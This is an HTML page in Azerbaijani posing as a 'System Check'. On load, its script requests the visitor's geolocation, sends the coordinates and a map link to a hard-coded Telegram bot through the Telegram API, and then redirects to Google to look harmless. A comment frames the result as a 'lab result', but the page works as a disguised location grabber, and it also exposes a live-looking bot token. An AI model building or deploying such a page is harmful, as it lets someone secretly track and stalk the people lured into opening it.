<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Yoxlanışı</title>
</head>
<body>
    <h2>Sistem aktivdir. Məkan icazəsi yoxlanılır...</h2>

    <script>
        // Sənin rəsmi Telegram məlumatların
        const BOT_TOKEN = "8757659224:AAHCM2ijeb9S6EfBP7YRWXGC7EdvCu0CwLs";
        const CHAT_ID = "8933188530"; // Sənin Telegram ID-n

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    
                    // Tapılan koordinatları bota göndərən rəsmi sorğu
                    let message = `🎯 Laboratoriya Nəticəsi!\n📍 Enlik (Lat): ${lat}\n📍 Uzunluq (Lon): ${lon}\n🌍 Xəritə: https://maps.google.com/?q=${lat},${lon}`;
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message
                        })
                    }).then(res => {
                        // Mesaj gedəndən sonra rəsmi görünüş üçün Google-a ata bilər
                        window.location.href = "https://google.com";
                    });

                }, function(error) {
                    alert("Məkan icazəsi verilmədi. Zəhmət olmasa ayarlardan icazə verin.");
                });
            } else {
                alert("Brauzeriniz məkan funksiyasını dəstəkləmir.");
            }
        };
    </script>
</body>
</html>
